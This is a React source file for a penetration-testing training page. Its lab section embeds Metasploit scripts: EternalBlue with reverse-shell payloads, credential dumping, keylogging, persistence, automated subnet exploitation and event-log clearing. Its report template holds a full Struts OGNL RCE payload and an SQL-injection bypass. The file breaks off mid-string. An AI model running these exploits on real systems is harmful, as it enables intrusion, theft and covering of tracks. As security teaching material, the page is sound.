import { useState } from 'react';
import {
  Shield, Target, Search, Scan, Zap, FileText, Terminal,
  Lock, AlertTriangle, CheckCircle, Code,
  Eye, Network, BookOpen, Award, ExternalLink
} from 'lucide-react';
import { Link } from 'react-router-dom';

interface PenetrationTestingConceptProps {
  onBack: () => void;
}

export const PenetrationTestingConcept = ({ onBack }: PenetrationTestingConceptProps) => {
  const [activeTab, setActiveTab] = useState('methodology');

  const tabs = [
    { id: 'methodology', label: 'Methodology', icon: Shield },
    { id: 'phases', label: 'Phases', icon: Target },
    { id: 'lab', label: 'Lab', icon: Terminal },
    { id: 'tools', label: 'Tools', icon: Code },
    { id: 'references', label: 'References', icon: BookOpen }
  ];

  return (
    <div className="min-h-screen bg-white dark:bg-slate-950 text-slate-900 dark:text-white p-8">
      <div className="max-w-7xl mx-auto">
        {/* Back Button */}
        <button
          onClick={onBack}
          className="mb-6 px-4 py-2 bg-slate-100 dark:bg-slate-800 hover:bg-slate-200 dark:hover:bg-slate-700 text-slate-900 dark:text-white rounded-lg transition-all border border-slate-300 dark:border-slate-700"
        >
          ← Back to Dashboard
        </button>

        {/* Header */}
        <div className="mb-8">
          <div className="flex items-center gap-4 mb-4">
            <div className="p-4 bg-gradient-to-br from-emerald-500 to-emerald-600 rounded-xl">
              <Shield className="w-12 h-12 text-white" />
            </div>
            <div>
              <h1 className="text-4xl font-bold text-slate-900 dark:text-white">Penetration Testing Methodology</h1>
              <p className="text-slate-600 dark:text-slate-300 text-lg">Professional Ethical Hacking Lifecycle</p>
            </div>
          </div>
          <div className="bg-red-500/20 border border-red-500/50 rounded-lg p-4">
            <p className="flex items-center gap-2 text-red-200">
              <AlertTriangle className="w-5 h-5" />
              <strong>LEGAL NOTICE:</strong> All penetration testing activities MUST be authorized in writing.
              Unauthorized access to computer systems is illegal under the Computer Fraud and Abuse Act (CFAA)
              and similar laws worldwide.
            </p>
          </div>
        </div>

        {/* Tab Navigation */}
        <div className="flex gap-2 mb-6 overflow-x-auto">
          {tabs.map((tab) => {
            const Icon = tab.icon;
            return (
              <button
                key={tab.id}
                onClick={() => setActiveTab(tab.id)}
                className={`flex items-center gap-2 px-6 py-3 rounded-lg font-semibold transition-all whitespace-nowrap ${
                  activeTab === tab.id
                    ? 'bg-emerald-500 text-white'
                    : 'bg-slate-100 dark:bg-slate-800 hover:bg-slate-200 dark:hover:bg-slate-700 text-slate-600 dark:text-slate-300 border border-slate-300 dark:border-slate-700'
                }`}
              >
                <Icon className="w-5 h-5" />
                {tab.label}
              </button>
            );
          })}
        </div>

        {/* Tab Content */}
        <div className="bg-white dark:bg-slate-900 rounded-2xl p-8 shadow-2xl border border-slate-200 dark:border-slate-800">
          {activeTab === 'methodology' && <MethodologyTab />}
          {activeTab === 'phases' && <PhasesTab />}
          {activeTab === 'lab' && <LabTab />}
          {activeTab === 'tools' && <ToolsTab />}
          {activeTab === 'references' && <ReferencesTab />}
        </div>
      </div>
    </div>
  );
};

const MethodologyTab = () => {
  return (
    <div className="space-y-8">
      <section>
        <h2 className="text-3xl font-bold mb-4 flex items-center gap-2 text-slate-900 dark:text-white">
          <Target className="w-8 h-8 text-emerald-500" />
          Complete Penetration Testing Lifecycle
        </h2>
        <p className="text-slate-600 dark:text-slate-300 text-lg leading-relaxed mb-6">
          Penetration testing (pentesting) is a systematic, authorized attempt to evaluate the security
          of an IT infrastructure by safely exploiting vulnerabilities. Unlike vulnerability assessments
          that only identify potential weaknesses, penetration tests actively exploit them to demonstrate
          real-world impact.
        </p>

        <div className="grid md:grid-cols-2 gap-4 mb-8">
          <div className="bg-emerald-50 dark:bg-emerald-500/20 border border-emerald-200 dark:border-emerald-500/50 rounded-lg p-6">
            <h3 className="text-xl font-semibold mb-3 flex items-center gap-2 text-slate-900 dark:text-white">
              <CheckCircle className="w-6 h-6 text-emerald-600 dark:text-emerald-400" />
              What is Pentesting?
            </h3>
            <ul className="space-y-2 text-slate-700 dark:text-slate-300">
              <li className="flex items-start gap-2">
                <span className="text-emerald-600 dark:text-emerald-400 mt-1">•</span>
                Simulated cyberattack on your systems
              </li>
              <li className="flex items-start gap-2">
                <span className="text-emerald-600 dark:text-emerald-400 mt-1">•</span>
                Identifies exploitable vulnerabilities
              </li>
              <li className="flex items-start gap-2">
                <span className="text-emerald-600 dark:text-emerald-400 mt-1">•</span>
                Tests effectiveness of security controls
              </li>
              <li className="flex items-start gap-2">
                <span className="text-emerald-600 dark:text-emerald-400 mt-1">•</span>
                Provides actionable remediation guidance
              </li>
            </ul>
          </div>

          <div className="bg-emerald-50 dark:bg-emerald-500/20 border border-emerald-200 dark:border-emerald-500/50 rounded-lg p-6">
            <h3 className="text-xl font-semibold mb-3 flex items-center gap-2 text-slate-900 dark:text-white">
              <Award className="w-6 h-6 text-emerald-600 dark:text-emerald-400" />
              Why is it Important?
            </h3>
            <ul className="space-y-2 text-slate-700 dark:text-slate-300">
              <li className="flex items-start gap-2">
                <span className="text-emerald-600 dark:text-emerald-400 mt-1">•</span>
                Proactively find security gaps before attackers
              </li>
              <li className="flex items-start gap-2">
                <span className="text-emerald-600 dark:text-emerald-400 mt-1">•</span>
                Compliance requirements (PCI DSS, HIPAA, SOC 2)
              </li>
              <li className="flex items-start gap-2">
                <span className="text-emerald-600 dark:text-emerald-400 mt-1">•</span>
                Validate security investments and policies
              </li>
              <li className="flex items-start gap-2">
                <span className="text-emerald-600 dark:text-emerald-400 mt-1">•</span>
                Build security awareness and readiness
              </li>
            </ul>
          </div>
        </div>
      </section>

      <section>
        <h2 className="text-2xl font-bold mb-4 text-slate-900 dark:text-white">Professional Standards & Certifications</h2>
        <div className="grid md:grid-cols-3 gap-4">
          <div className="bg-slate-50 dark:bg-slate-800 border border-slate-200 dark:border-slate-700 rounded-lg p-5">
            <h3 className="font-semibold text-lg mb-2 text-emerald-600 dark:text-emerald-400">CEH (Certified Ethical Hacker)</h3>
            <p className="text-sm text-slate-600 dark:text-slate-300">EC-Council certification covering ethical hacking and penetration testing fundamentals</p>
          </div>
          <div className="bg-slate-50 dark:bg-slate-800 border border-slate-200 dark:border-slate-700 rounded-lg p-5">
            <h3 className="font-semibold text-lg mb-2 text-emerald-600 dark:text-emerald-400">OSCP (Offensive Security Certified Professional)</h3>
            <p className="text-sm text-slate-600 dark:text-slate-300">Hands-on certification requiring 24-hour practical exam in a live lab environment</p>
          </div>
          <div className="bg-slate-50 dark:bg-slate-800 border border-slate-200 dark:border-slate-700 rounded-lg p-5">
            <h3 className="font-semibold text-lg mb-2 text-emerald-600 dark:text-emerald-400">PTES (Penetration Testing Execution Standard)</h3>
            <p className="text-sm text-slate-600 dark:text-slate-300">Industry framework defining penetration testing methodology and best practices</p>
          </div>
        </div>
      </section>

      <section>
        <h2 className="text-2xl font-bold mb-4 flex items-center gap-2">
          <Lock className="w-6 h-6 text-red-400" />
          Legal & Ethical Requirements
        </h2>
        <div className="bg-red-500/20 border border-red-500/50 rounded-lg p-6 space-y-4">
          <div>
            <h3 className="font-semibold text-lg mb-2 text-red-300">1. Written Authorization</h3>
            <p className="text-gray-300">
              ALWAYS obtain explicit written permission before conducting any penetration test.
              This document should specify scope, timeframes, authorized techniques, and emergency contacts.
            </p>
          </div>
          <div>
            <h3 className="font-semibold text-lg mb-2 text-red-300">2. Scope Definition</h3>
            <p className="text-gray-300">
              Clearly define what systems, networks, and applications are in scope. Test ONLY
              authorized targets. Attacking out-of-scope systems can result in criminal charges.
            </p>
          </div>
          <div>
            <h3 className="font-semibold text-lg mb-2 text-red-300">3. Rules of Engagement (ROE)</h3>
            <p className="text-gray-300">
              Establish testing hours, notification procedures, sensitive data handling, and
              escalation protocols. Define what happens if critical vulnerabilities are found.
            </p>
          </div>
          <div>
            <h3 className="font-semibold text-lg mb-2 text-red-300">4. Confidentiality & Non-Disclosure</h3>
            <p className="text-gray-300">
              Sign NDAs to protect client data. All findings are confidential and should never
              be shared publicly without explicit permission.
            </p>
          </div>
        </div>
      </section>

      <section>
        <h2 className="text-2xl font-bold mb-4 text-slate-900 dark:text-white">Types of Penetration Tests</h2>
        <div className="space-y-3">
          <div className="bg-slate-50 dark:bg-slate-800 rounded-lg p-4 border border-slate-200 dark:border-slate-700">
            <h3 className="font-semibold text-lg mb-2 flex items-center gap-2 text-slate-900 dark:text-white">
              <Eye className="w-5 h-5 text-emerald-600 dark:text-emerald-400" />
              Black Box Testing
            </h3>
            <p className="text-slate-600 dark:text-slate-300">
              Tester has no prior knowledge of the system. Simulates external attacker perspective.
            </p>
          </div>
          <div className="bg-slate-50 dark:bg-slate-800 rounded-lg p-4 border border-slate-200 dark:border-slate-700">
            <h3 className="font-semibold text-lg mb-2 flex items-center gap-2 text-slate-900 dark:text-white">
              <Eye className="w-5 h-5 text-yellow-500" />
              Gray Box Testing
            </h3>
            <p className="text-slate-600 dark:text-slate-300">
              Tester has partial knowledge (e.g., credentials). Simulates insider threat or authenticated user.
            </p>
          </div>
          <div className="bg-slate-50 dark:bg-slate-800 rounded-lg p-4 border border-slate-200 dark:border-slate-700">
            <h3 className="font-semibold text-lg mb-2 flex items-center gap-2 text-slate-900 dark:text-white">
              <Eye className="w-5 h-5 text-emerald-600 dark:text-emerald-400" />
              White Box Testing
            </h3>
            <p className="text-slate-600 dark:text-slate-300">
              Tester has full knowledge (source code, architecture). Most thorough testing approach.
            </p>
          </div>
        </div>
      </section>
    </div>
  );
};

const PhasesTab = () => {
  const phases = [
    {
      number: 1,
      title: 'Planning & Scoping',
      icon: FileText,
      color: 'blue',
      description: 'Define objectives, obtain authorization, and establish rules of engagement',
      activities: [
        'Define penetration test objectives and goals',
        'Identify systems and applications in scope',
        'Obtain written authorization from stakeholders',
        'Establish Rules of Engagement (ROE) and testing windows',
        'Define success criteria and deliverables',
        'Arrange emergency contacts and escalation procedures'
      ],
      deliverables: ['Statement of Work (SOW)', 'Authorization Letter', 'Rules of Engagement', 'Test Plan']
    },
    {
      number: 2,
      title: 'Reconnaissance',
      icon: Search,
      color: 'green',
      description: 'Gather intelligence about the target using OSINT and passive techniques',
      activities: [
        'WHOIS lookups and DNS enumeration',
        'Search engine reconnaissance (Google dorking)',
        'Social media intelligence gathering',
        'Employee information discovery (LinkedIn)',
        'Technology stack identification (BuiltWith, Wappalyzer)',
        'Public data breach database searches',
        'Subdomain enumeration and asset discovery'
      ],
      tools: ['Maltego', 'theHarvester', 'Shodan', 'Recon-ng', 'WHOIS', 'DNSdumpster'],
      example: 'reconnaissance_automation'
    },
    {
      number: 3,
      title: 'Scanning & Enumeration',
      icon: Scan,
      color: 'yellow',
      description: 'Actively probe target systems to identify vulnerabilities and services',
      activities: [
        'Network scanning to discover live hosts',
        'Port scanning to identify open services',
        'Service and version detection',
        'Operating system fingerprinting',
        'Vulnerability scanning and assessment',
        'Web application scanning',
        'Network mapping and topology discovery'
      ],
      tools: ['Nmap', 'Nessus', 'OpenVAS', 'Nikto', 'Masscan', 'Burp Suite'],
      example: 'nmap_scanning'
    },
    {
      number: 4,
      title: 'Exploitation',
      icon: Zap,
      color: 'red',
      description: 'Attempt to exploit identified vulnerabilities to gain access',
      activities: [
        'Exploit known vulnerabilities',
        'Password cracking and credential attacks',
        'Web application exploitation (SQLi, XSS, etc.)',
        'Privilege escalation (local and domain)',
        'Lateral movement across the network',
        'Data exfiltration demonstrations',
        'Persistence mechanism installation (with permission)'
      ],
      tools: ['Metasploit Framework', 'Burp Suite Pro', 'sqlmap', 'Hydra', 'John the Ripper', 'Mimikatz'],
      example: 'metasploit_exploitation'
    },
    {
      number: 5,
      title: 'Reporting',
      icon: FileText,
      color: 'purple',
      description: 'Document findings and provide actionable remediation recommendations',
      activities: [
        'Executive summary for management',
        'Technical findings with evidence',
        'Risk ratings using CVSS scores',
        'Step-by-step reproduction steps',
        'Remediation recommendations prioritized by risk',
        'Strategic security improvement roadmap'
      ],
      deliverables: ['Executive Summary', 'Technical Report', 'Risk Matrix', 'Remediation Plan'],
      example: 'report_generation'
    }
  ];

  const [expandedPhase, setExpandedPhase] = useState<number | null>(1);

  return (
    <div className="space-y-6">
      <h2 className="text-3xl font-bold mb-6 text-slate-900 dark:text-white">Five-Phase Penetration Testing Methodology</h2>
      <p className="text-slate-600 dark:text-slate-300 text-lg mb-8">
        Professional penetration testing follows a systematic five-phase approach based on industry
        standards including PTES (Penetration Testing Execution Standard), NIST SP 800-115, and
        OWASP Testing Guide.
      </p>

      {phases.map((phase) => {
        const Icon = phase.icon;
        const isExpanded = expandedPhase === phase.number;

        return (
          <div key={phase.number} className="border border-slate-200 dark:border-slate-700 rounded-lg overflow-hidden">
            <button
              onClick={() => setExpandedPhase(isExpanded ? null : phase.number)}
              className={`w-full p-6 bg-emerald-500 text-white flex items-center justify-between hover:bg-emerald-600 transition-colors`}
            >
              <div className="flex items-center gap-4">
                <div className="bg-white/20 rounded-full p-3">
                  <Icon className="w-8 h-8" />
                </div>
                <div className="text-left">
                  <div className="text-sm font-semibold opacity-90">Phase {phase.number}</div>
                  <div className="text-2xl font-bold">{phase.title}</div>
                  <div className="text-sm opacity-90 mt-1">{phase.description}</div>
                </div>
              </div>
              <div className={`transform transition-transform ${isExpanded ? 'rotate-180' : ''}`}>
                <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
                </svg>
              </div>
            </button>

            {isExpanded && (
              <div className="bg-slate-50 dark:bg-slate-800 p-6 space-y-6">
                <div>
                  <h3 className="text-xl font-semibold mb-3 text-slate-900 dark:text-white">Key Activities</h3>
                  <ul className="space-y-2">
                    {phase.activities.map((activity, idx) => (
                      <li key={idx} className="flex items-start gap-3">
                        <CheckCircle className="w-5 h-5 text-emerald-600 dark:text-emerald-400 mt-0.5 flex-shrink-0" />
                        <span className="text-slate-700 dark:text-slate-300">{activity}</span>
                      </li>
                    ))}
                  </ul>
                </div>

                {phase.tools && (
                  <div>
                    <h3 className="text-xl font-semibold mb-3 text-slate-900 dark:text-white">Common Tools</h3>
                    <div className="flex flex-wrap gap-2">
                      {phase.tools.map((tool, idx) => (
                        <span key={idx} className="px-3 py-1 bg-emerald-100 dark:bg-emerald-500/30 border border-emerald-300 dark:border-emerald-500/50 rounded-full text-sm text-emerald-900 dark:text-emerald-300">
                          {tool}
                        </span>
                      ))}
                    </div>
                  </div>
                )}

                {phase.deliverables && (
                  <div>
                    <h3 className="text-xl font-semibold mb-3 text-slate-900 dark:text-white">Deliverables</h3>
                    <div className="flex flex-wrap gap-2">
                      {phase.deliverables.map((deliverable, idx) => (
                        <span key={idx} className="px-3 py-1 bg-emerald-100 dark:bg-emerald-500/30 border border-emerald-300 dark:border-emerald-500/50 rounded-full text-sm text-emerald-900 dark:text-emerald-300">
                          {deliverable}
                        </span>
                      ))}
                    </div>
                  </div>
                )}
              </div>
            )}
          </div>
        );
      })}
    </div>
  );
};

const LabTab = () => {
  const [activeExample, setActiveExample] = useState<'reconnaissance' | 'nmap' | 'metasploit' | 'report' | 'wifi'>('reconnaissance');

  const examples: Record<'reconnaissance' | 'nmap' | 'metasploit' | 'report' | 'wifi', { title: string; description: string; code: string }> = {
    reconnaissance: {
      title: 'Automated Reconnaissance Script',
      description: 'Python script for automated OSINT gathering',
      code: `#!/usr/bin/env python3
"""
Automated Reconnaissance Tool
Purpose: Gather OSINT on target domain
LEGAL: Only run against authorized targets with written permission
"""

import subprocess
import socket
import whois
import dns.resolver
import requests
from datetime import datetime

class ReconTool:
    def __init__(self, target_domain):
        self.domain = target_domain
        self.results = {}

    def whois_lookup(self):
        """Perform WHOIS lookup on target domain"""
        print(f"[*] Performing WHOIS lookup on {self.domain}...")
        try:
            w = whois.whois(self.domain)
            self.results['whois'] = {
                'registrar': w.registrar,
                'creation_date': w.creation_date,
                'expiration_date': w.expiration_date,
                'name_servers': w.name_servers
            }
            print(f"[+] Registrar: {w.registrar}")
            print(f"[+] Name Servers: {w.name_servers}")
        except Exception as e:
            print(f"[-] WHOIS lookup failed: {e}")

    def dns_enumeration(self):
        """Enumerate DNS records"""
        print(f"\\n[*] Enumerating DNS records for {self.domain}...")
        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA']
        dns_results = {}

        for record_type in record_types:
            try:
                answers = dns.resolver.resolve(self.domain, record_type)
                records = [str(rdata) for rdata in answers]
                dns_results[record_type] = records
                print(f"[+] {record_type} records: {records}")
            except:
                pass

        self.results['dns'] = dns_results

    def subdomain_enumeration(self):
        """Basic subdomain enumeration"""
        print(f"\\n[*] Enumerating common subdomains...")
        common_subdomains = [
            'www', 'mail', 'ftp', 'admin', 'portal',
            'api', 'dev', 'staging', 'test', 'vpn'
        ]
        found_subdomains = []

        for sub in common_subdomains:
            subdomain = f"{sub}.{self.domain}"
            try:
                socket.gethostbyname(subdomain)
                found_subdomains.append(subdomain)
                print(f"[+] Found: {subdomain}")
            except:
                pass

        self.results['subdomains'] = found_subdomains

    def technology_detection(self):
        """Detect web technologies"""
        print(f"\\n[*] Detecting web technologies...")
        try:
            url = f"https://{self.domain}"
            response = requests.get(url, timeout=5, verify=False)

            headers = response.headers
            tech_info = {
                'server': headers.get('Server', 'Unknown'),
                'x-powered-by': headers.get('X-Powered-By', 'Unknown'),
                'status_code': response.status_code
            }

            self.results['technology'] = tech_info
            print(f"[+] Server: {tech_info['server']}")
            print(f"[+] Powered by: {tech_info['x-powered-by']}")

        except Exception as e:
            print(f"[-] Technology detection failed: {e}")

    def generate_report(self):
        """Generate reconnaissance report"""
        print("\\n" + "="*60)
        print(f"RECONNAISSANCE REPORT - {self.domain}")
        print(f"Generated: {datetime.now()}")
        print("="*60)

        for section, data in self.results.items():
            print(f"\\n{section.upper()}:")
            print(data)

# Usage
if __name__ == "__main__":
    # WARNING: Only use on authorized targets
    target = "example.com"  # Replace with authorized target

    recon = ReconTool(target)
    recon.whois_lookup()
    recon.dns_enumeration()
    recon.subdomain_enumeration()
    recon.technology_detection()
    recon.generate_report()
`
    },
    nmap: {
      title: 'Nmap Network Scanning',
      description: 'Comprehensive Nmap scanning examples',
      code: `#!/bin/bash
# Nmap Scanning Cheat Sheet
# LEGAL WARNING: Only scan authorized targets

TARGET="192.168.1.0/24"  # Replace with authorized target

echo "=== NMAP SCANNING METHODOLOGY ==="

# 1. Host Discovery (Ping Sweep)
echo "[*] Phase 1: Host Discovery"
nmap -sn $TARGET -oN host_discovery.txt
# -sn: Ping scan, no port scan

# 2. Port Scanning
echo "[*] Phase 2: Port Scanning"

# Quick scan of common ports
nmap -F $TARGET -oN quick_scan.txt
# -F: Fast mode (100 most common ports)

# Full TCP port scan
nmap -p- $TARGET -oN full_tcp_scan.txt
# -p-: All 65535 ports

# Top 1000 ports with service detection
nmap -sV -p 1-1000 $TARGET -oN service_detection.txt
# -sV: Version detection

# 3. Operating System Detection
echo "[*] Phase 3: OS Detection"
nmap -O $TARGET -oN os_detection.txt
# -O: Enable OS detection

# 4. Aggressive Scan (comprehensive)
echo "[*] Phase 4: Aggressive Scan"
nmap -A -T4 $TARGET -oN aggressive_scan.txt
# -A: Aggressive scan (OS, version, scripts, traceroute)
# -T4: Timing template (faster)

# 5. Nmap Scripting Engine (NSE)
echo "[*] Phase 5: Vulnerability Scanning with NSE"

# Run default safe scripts
nmap --script=default $TARGET -oN nse_default.txt

# Run vulnerability scripts
nmap --script=vuln $TARGET -oN nse_vuln.txt

# Specific script examples:
# HTTP enumeration
nmap --script=http-enum -p 80,443 $TARGET

# SMB enumeration
nmap --script=smb-enum-shares,smb-enum-users -p 445 $TARGET

# SSH brute force (use with caution)
nmap --script=ssh-brute --script-args userdb=users.txt,passdb=pass.txt -p 22 $TARGET

# 6. Evasion Techniques
echo "[*] Phase 6: Stealth Scanning"

# SYN stealth scan
nmap -sS $TARGET -oN stealth_scan.txt
# -sS: SYN scan (half-open)

# Fragmented packets
nmap -f $TARGET
# -f: Fragment packets

# Decoy scanning
nmap -D RND:10 $TARGET
# -D RND:10: Use 10 random decoys

# 7. Output Formats
echo "[*] Saving results in multiple formats"
nmap -sV -p- $TARGET \\
  -oN scan_normal.txt \\
  -oX scan_xml.xml \\
  -oG scan_grepable.txt \\
  -oA scan_all

# Convert XML to HTML report
xsltproc scan_xml.xml -o scan_report.html

echo "[+] Scanning complete! Review output files."
echo "[!] Remember: Document all findings for the pentest report"

# NMAP TIMING TEMPLATES
# -T0: Paranoid (very slow, IDS evasion)
# -T1: Sneaky (slow)
# -T2: Polite (less bandwidth)
# -T3: Normal (default)
# -T4: Aggressive (fast, assumes good network)
# -T5: Insane (very fast, may miss hosts)

# COMMON PORT RANGES
# -p 22: SSH
# -p 80,443: HTTP/HTTPS
# -p 21: FTP
# -p 3389: RDP
# -p 445: SMB
# -p 3306: MySQL
# -p 5432: PostgreSQL
# -p 27017: MongoDB
`
    },
    metasploit: {
      title: 'Metasploit Exploitation Framework',
      description: 'Metasploit exploitation examples and RC scripts',
      code: `# Metasploit Framework Resource Script
# Purpose: Automated exploitation workflow
# LEGAL: Only use against authorized targets

# ==========================================
# METASPLOIT BASIC WORKFLOW
# ==========================================

# 1. Database Setup
db_status
workspace -a pentest_project
db_nmap -sV -p- 192.168.1.100

# 2. Search for exploits
search type:exploit platform:windows smb

# ==========================================
# EXAMPLE 1: EternalBlue (MS17-010)
# ==========================================
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
set PAYLOAD windows/x64/meterpreter/reverse_tcp
check
exploit

# If successful, you get a Meterpreter session

# ==========================================
# METERPRETER POST-EXPLOITATION COMMANDS
# ==========================================

# System information
sysinfo
getuid
ps

# Privilege escalation
getsystem

# Hash dumping
hashdump
run post/windows/gather/smart_hashdump

# Screenshot
screenshot

# Keylogging
keyscan_start
keyscan_dump
keyscan_stop

# File operations
download C:\\Users\\Admin\\Documents\\sensitive.txt
upload /root/backdoor.exe C:\\Windows\\Temp\\

# Persistence
run persistence -X -i 60 -p 4444 -r 192.168.1.50

# Lateral movement
run post/windows/gather/enum_shares
run post/windows/gather/enum_domain_users

# ==========================================
# EXAMPLE 2: Web Application Exploitation
# ==========================================

# Tomcat manager brute force
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS 192.168.1.100
set RPORT 8080
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

# Tomcat WAR deployment
use exploit/multi/http/tomcat_mgr_upload
set RHOST 192.168.1.100
set RPORT 8080
set HttpUsername admin
set HttpPassword password
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit

# ==========================================
# EXAMPLE 3: Password Attacks
# ==========================================

# SSH brute force
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.0/24
set USER_FILE users.txt
set PASS_FILE rockyou.txt
set THREADS 10
run

# SMB login scanner
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.0/24
set SMBUser administrator
set SMBPass passwords.txt
run

# ==========================================
# EXAMPLE 4: Post-Exploitation Modules
# ==========================================

# Windows privilege escalation check
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

# Dump browser credentials
use post/windows/gather/enum_chrome
set SESSION 1
run

# Network sniffing
use post/windows/gather/packetrecorder
set SESSION 1
set INTERFACE 1
run

# ==========================================
# METASPLOIT AUTOMATION (RC SCRIPT)
# ==========================================

# Save this as autopwn.rc and run: msfconsole -r autopwn.rc

<ruby>
framework.db.workspace.default
framework.db.create_workspace("autopwn")
framework.db.workspace.set("autopwn")
</ruby>

# Run Nmap scan and import
db_nmap -sV -p- --script vuln 192.168.1.0/24

# Auto-exploit discovered services
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

# Check for EternalBlue
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
run

# Attempt exploitation on vulnerable hosts
<ruby>
framework.db.hosts.each do |host|
  if host.vulns.any? { |v| v.name =~ /ms17-010/ }
    print_status("Exploiting #{host.address}")
    run_single("use exploit/windows/smb/ms17_010_eternalblue")
    run_single("set RHOST #{host.address}")
    run_single("set PAYLOAD windows/x64/meterpreter/reverse_tcp")
    run_single("set LHOST 192.168.1.50")
    run_single("exploit -j")
  end
end
</ruby>

# ==========================================
# BEST PRACTICES
# ==========================================

# 1. Always document your session IDs
sessions -l

# 2. Background sessions instead of killing them
background

# 3. Route traffic through compromised hosts
route add 10.0.0.0 255.255.255.0 1

# 4. Use resource scripts for repeatability
makerc /root/autopwn.rc

# 5. Clean up artifacts after testing
clearev  # Clear event logs (Windows)
`
    },
    report: {
      title: 'Penetration Test Report Template',
      description: 'Professional report structure and risk rating',
      code: `# PENETRATION TEST REPORT
# Client: [CLIENT NAME]
# Date: [DATE]
# Tester: [YOUR NAME/COMPANY]

## EXECUTIVE SUMMARY

### Overview
This penetration test was conducted from [START DATE] to [END DATE] against
[CLIENT]'s external network infrastructure and web applications. The assessment
identified [X] critical, [Y] high, [Z] medium, and [W] low-severity vulnerabilities.

### Key Findings
- CRITICAL: Unauthenticated remote code execution on web server (CVE-2024-XXXXX)
- HIGH: SQL injection allowing database compromise
- HIGH: Weak password policies enabling credential compromise
- MEDIUM: Missing security headers on web application
- LOW: Information disclosure via verbose error messages

### Risk Rating Summary
| Severity  | Count | CVSS Range |
|-----------|-------|------------|
| Critical  |   2   | 9.0 - 10.0 |
| High      |   5   | 7.0 - 8.9  |
| Medium    |   8   | 4.0 - 6.9  |
| Low       |   12  | 0.1 - 3.9  |

### Overall Risk Assessment
The organization's security posture is **HIGH RISK**. Multiple critical
vulnerabilities provide unauthenticated attackers with the ability to
compromise sensitive systems and data.

### Recommendations Priority
1. Immediately patch web server (EternalBlue equivalent)
2. Implement parameterized queries to prevent SQL injection
3. Enforce strong password policy with MFA
4. Deploy Web Application Firewall (WAF)
5. Implement security awareness training

---

## TECHNICAL FINDINGS

### Finding #1: Unauthenticated Remote Code Execution

**Severity:** CRITICAL
**CVSS Score:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
**Affected System:** web.client.com (192.168.1.100)
**CWE:** CWE-94: Improper Control of Generation of Code

#### Description
The web server running Apache Struts 2.5.10 is vulnerable to remote code
execution via CVE-2017-5638. An unauthenticated attacker can execute arbitrary
commands by sending a malicious Content-Type header.

#### Evidence
\`\`\`bash
curl -X POST https://web.client.com/upload \\
  -H "Content-Type: %{(#_='multipart/form-data').(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" \\
  -F "file=@test.txt"

Response: nt authority\\system
\`\`\`

#### Impact
- Complete server compromise
- Access to sensitive customer data
- Ability to pivot to internal network
- Potential for ransomware deployment

#### Remediation
1. **Immediate:** Upgrade Apache Struts to version 2.5.26 or later
2. Implement Web Application Firewall (WAF) rules
3. Conduct full system audit for indicators of compromise
4. Reset all credentials on compromised system

#### References
- https://nvd.nist.gov/vuln/detail/CVE-2017-5638
- https://www.rapid7.com/db/modules/exploit/multi/http/struts2_content_type_ognl

---

### Finding #2: SQL Injection in Login Form

**Severity:** HIGH
**CVSS Score:** 8.6 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L)
**Affected System:** portal.client.com/login.php
**CWE:** CWE-89: SQL Injection

#### Description
The login form is vulnerable to boolean-based SQL injection, allowing an
attacker to bypass authentication and extract database contents.

#### Proof of Concept
\`\`\`sql
-- Payload in username field:
admin' OR '1'='1' --

-- Results in query:
SELECT * FROM users WHERE username='admin' OR '1'='1' --' AND password='anything'

-- Authentication bypass achieved
\`\`\`

#### Data Extraction
Using sqlmap, the following databases were accessed:
\`\`\`bash
sqlmap -u "https://portal.client.com/login.php" \\
  --data="username=admin&password=test" \\
  -p username --dbs

[*] Available databases:
[*] customers
[*] financial_records
[*] user_accounts
\`\`\`

#### Impact
- Complete database compromise
- Exposure of customer PII
- Potential regulatory violations (GDPR, CCPA)
- Reputation damage

#### Remediation
1. **Immediate:** Implement parameterized queries (prepared statements)
2. Apply input validation and sanitization
3. Implement least-privilege database access
4. Deploy WAF with SQL injection signatures
5. Conduct code review of all database queries

#### Example Fix
\`\`\`php
// VULNERABLE CODE
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";

// SECURE CODE
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $hashed_password]);
\`\`\`

---

## CVSS SCORING METHODOLOGY

The Common Vulnerability Scoring System (CVSS) v3.1 was used to rate findings:

**Base Metrics:**
- Attack Vector (AV): Network (N), Adjacent (A), Local (L), Physical (P)
- Attack Complexity (AC): Low (L), High (H)
- Privileges Required (PR): None (N), Low (L), High (H)
- User Interaction (UI): None (N), Required (R)
- Scope (S): Unchanged (U), Changed (C)
- Confidentiality (C): None (N), Low (L), High (H)
- Integrity (I): None (N), Low (L), High (H)
- Availability (A): None (N), Low (L), High (H)

---

## TESTING METHODOLOGY

This penetration test followed the Penetration Testing Execution Standard (PTES):

1. **Pre-Engagement:** Scope definition, ROE, authorization
2. **Intelligence Gathering:** OSINT, passive reconnaissance
3. **Threat Modeling:** Attack surface analysis
4. **Vulnerability Analysis:** Automated and manual testing
5. **Exploitation:** Proof-of-concept attacks
6. **Post-Exploitation:** Privilege escalation, lateral movement
7. **Reporting:** This document

---

## APPENDIX A: TOOLS USED

- Nmap 7.94 - Network scanning
